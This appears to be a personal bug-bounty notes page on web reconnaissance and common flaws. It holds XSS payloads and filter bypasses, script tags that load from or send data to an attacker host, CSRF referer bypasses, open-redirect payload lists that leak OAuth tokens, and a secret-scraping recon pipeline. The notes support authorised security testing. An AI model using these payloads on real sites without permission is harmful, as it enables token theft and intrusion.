---
layout: single
classes: #wide
title: "Bounties"
sidebar:
    title: "Bounties"
    nav: infosec
collection: infopages
permalink: /infosec/general/
toc: true
toc_sticky: true
author_profile: true
---

monitors with ssl mate -> new subdomains new ssl cert see online and can start looking at it

# EMAIL - ryushe@bugcrowdninja-demon.com

# DNS
## DNS rebinding 
[blog](https://www.paloaltonetworks.com/cyberpedia/what-is-dns-rebinding)
* Attempts to bypass restrictions of SOP
1. register domain eg. `http://badsite.com` delegating site to personal controled dns
1. employee clicks on `http://badsite.com` 
1. dns controlled by bad actor sends correct ip to employees request with short TTL
    - dns sets the ttl policy
1. employee browser downloads page with malicious code binding to local ip of attackers dns
1. `http://badsite.com` now points to 60.6.6.60. Because ip is same origin attackers code can exfiltrate company information and sensitive data
 
# XSS
`<script>prompt()</script>`  
`<script>alert("123")</script>`  
`'"-->`  
[payloads](https://github.com/payloadbox/xss-payload-list)  


# Domain Enumeration/recon
Amass - discovering subdomains & content    
- ex: `amass enum -brute -active -d domain.com -o amass-output.txt`  

httprobe - find working http & https servers    
- ex: `cat amass-output.txt | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -c 50 | tee online-domains.txt `   

[anew](https://github.com/tomnomnom/anew) - see what domains might be new  
- ex: `cat new-output.txt | anew old-output.txt | httprobe`

dnsgen - through look thru of urls  
- ex: `cat amass-output.txt | dnsgen - | httprobe`  

aquatone - visual inspection (accepts endpoints and files as well as domains)  
- ex: `cat domains-endpoints.txt | aquatone`  

ffuf - fuzzing  

waybackmachine scanner - srapes /robots.txt for all doamins and scrape as many years as possible  
- url - [here](https://gist.github.com/mhmdiaa)
- after scan each endpoint with ffuf
- Scraping /robots.txt but also main homepage of each subdomain  

Param scanner - scraping each endpoint and searching for input names, ids and js params
- [input scanner]( https://github.com/zseano/InputScanner) - looks for `<input>` and scrapes names and id then try it as a peram  
- Link finder/parameth also good peram scanners  

Any changes - takes list of urls and regulary changes for new changes on page

# Methodology
- Devs make mistakes  
- Stick to what you know and don't get overwhelmed
- recon recon recon

# WAFs
## LEARN:   
everything about WAF from security perspective [here](https://github.com/0xInfection/Awesome-WAF)

# Common issues to look for
## XSS
- `<img src=x onerror=alert(0)>`
- `?"></script><base%20c%3D=href%3Dhttps:\mysite>`
    - ex script to send back to site
- [Payloads](https://github.com/payloadbox/xss-payload-list)
- Tools (not sure abou thte category test):
    - general [xssrapy](https://github.com/DanMcInerney/xsscrapy)
    - DOM [blueclosure](https://www.blueclosure.com/) - paid
    - [KNOXSS](https://knoxss.me/?page_id=1974) - paid

### XSS WAF filter?
- yes - bad since xss most common to mitigate vuln
    - what else are they just filtering?
        - eg: SSRF? Filtering just internal ips?
    - shows overall security

### Testing for XSS and filtering
1. testing different encoding - weird behavior?
- does single encoding or double encoding do anything?
    - encoding changes once sent may be finding
    - encoding is always defaulted to the same might be nothing
- Ghetto Bypass (encodings to try) - [here](https://d3adend.org/xss/ghettoBypass)
2. Reverse engineering the dev's thoughts 
    - why did they create this and where else could this filter be:
        - filtering full tags but not filtering `<script`
            - bypass: `<script src=//mysite.com?c=`
                - appending tag to parameter value within the html
        - blacklist of bad html tags?
            - maybe forgot to add `<svg>`
        - how does website handle encodings, file uploads
    - Testing for XSS flow:
        - how are non malicious html tags handled 
            - eg: `<h1>`
        - Incomplete tags?
            - eg: `<iframe src=//url.com/c=`
        - encodings?
        - blacklist?
#### XSS filter bypass 
[here](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)

### POC
alerts and such blocked?  
simple: `console.log("exploit completed)` works

## CSRF
force user to do action on target website from your website (usually vial HTML form ) 
- eg: `<form action="/login" method="POST">`

Places to start:
- areas where should be secure
    - eg: updating account info

What did it do?:
- reflect changes but with SCRF error?
- info shown?

If an area has different protections? Why
- Different team
- old codebase
- different peram name

Common approach to security:
- devs check if referer is their website
    - if so execute
    - if not disreguard
- Issue - sometimes checks only if referer header is found if not, no checks are done
- Gets blank referer:
    - `<meta name="referrer" content="no-referrer" />`
    `<iframe src=”data:text/html;base64,form_code_here”>`
- Sometimes only check if domain is found in the referer
    - creating domain on personal site and visting may bypass
        - `https://www.yoursite.com/https://www.theirsite.com/`

Since CSRF enables us to make requests under another user, can we force a user to be charged?

## Open url redirects
Common in programs that use oauth with tokens and a redirect     

encode: & ? # / \  
- App will decode AFTER first redirect
- sometimes need to double encode

Could be dropped because of:
* too many redirects
* too many parameters

ex redirect:   
normal: `https://www.target.com/login?client_id=123&redirect_url=/sosecure`  
bad: `https://www.target.com/login?client_id=123&redirect_url=https://www.target.com/redirect?redirect=1&url=https://www.zseano.com/`
- this example leads to token being sent to zseano.com

### Keywords for redirection
```
goto
redirect
location
url
link
dest / destination
referer
forward
```

### Common issues
* Not ecoding values correctly
    - especially if target allows for /localRedirects

### Google searching for vuln endpoints
```
return, return_url, rUrl, cancelUrl, url, redirect, follow, goto, returnTo, returnUrl, r_url, history, goback, redirectTo, redirectUrl, redirUrl
```


### Is XSS possible?
- redirect -> Location: (not possible)
- redirect -> window.location: (test for js)

common bypass filters:  
```
java%0d%0ascript%0d%0a:alert(0)
j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
java%07script:prompt`0`
java%09scrip%07t:prompt`0`
jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript
pjavascriptt:confirm`0`

```

### Payloads:
``` 
\/yoururl.com
\/\/yoururl.com
\\yoururl.com
//yoururl.com
//theirsite@yoursite.com
/\/yoursite.com
https://yoursite.com%3F.theirsite.com/
https://yoursite.com%2523.theirsite.com/
https://yoursite?c=.theirsite.com/ (use # \ also)
//%2F/yoursite.com
////yoursite.com
https://theirsite.computer/
https://theirsite.com.mysite.com
/%0D/yoursite.com (Also try %09, %00, %0a, %07)
/%2F/yoururl.com
/%5Cyoururl.com
//google%E3%80%82com
```

## SSRF
In scope domain issueing request to an url/endpoint you have defined  
- Looking for API console (typically on dev docs page)
    - typically has freatures that take a url peram to execute code
- Test how handle redirects
- Setting up simple redirect script with XAMPP
    - NGROK to expose it
    - add sleep(time) - see if server hangs out
    - mayber filter only checking parameter value and not the redirect value
    - check if open redirect works
 
### Tools: 
- XAMPP - run php code locally 
- NGROK - public ip 

# Wordlists
seclists - /usr/share/wordlists/seclists
[onelistforall](https://github.com/six2dez/OneListForAll) 

# lostsec methodology
1. `subfinder -dL urls.txt -all -recursive -o new-subdomains.txt`
1. `curl -s https://crt.sh/\?q\=\navan.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' | anew new-subdomains.txt`
1. `cat new-subdomains.txt | httpx-toolkit -l new-subdomains.txt -ports 443,80,8080,8000,8888 -threads 200 > subdomains_alive.txt`
    - httpx-toolkit - crawling/scraping, benchmarking, web app testing, api testing and more
1. `naabu -list new-subdomains.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt`
    - naabu - port scanner and subdomain enumeration tool
1. `dirsearch -l subdomains_alive.txt -x 600,502,439,404,400 -R 5 --random-agent -t 100 -F -o directory.txt -w ~/OneListForAll/onelistforallshort.txt`
    - ik what it does lol
1. `cat subdomains_alive.txt | gau > params.txt`
    - gau (get all urls) fetches urls form alienvaults open threat exchange
1. `cat params.txt | uro -o filterparam.txt`
    - uro - declutters urls
1. `cat filterparam.txt | grep ".js$" > jsfiles.txt`
    - greps for .js
1. `cat jsfiles.txt | uro | anew jsfiles.txt`
    - anew - appends new files
1. `cat jsfiles.txt | while read url; do python3 ~/tools/SecretFinder/SecretFinder.py -i $url -o cli >> secret.txt; done`
    - for url run secretfinder
1. `nuclei -list filterparam.txt -c 70 -rl 200 -fhr -lfa -t -o nucleinavan.txt -es info`
    - nuclei - sends requests accross argets based on template

## Tools & links 
- [gau](https://github.com/lc/gau)
- [uro](https://github.com/s0md3v/uro)
- [subfinder](https://github.com/projectdiscovery/subfinder)
- [secretfinder](https://github.com/m4ll0k/SecretFinder)
- [nuclei](https://github.com/CharanRayudu/Custom-Nuclei-Templates.git) custom templates 


# another methodology
![lol](https://pbs.twimg.com/media/GJudL27WUAM16SB?format=jpg&name=small)
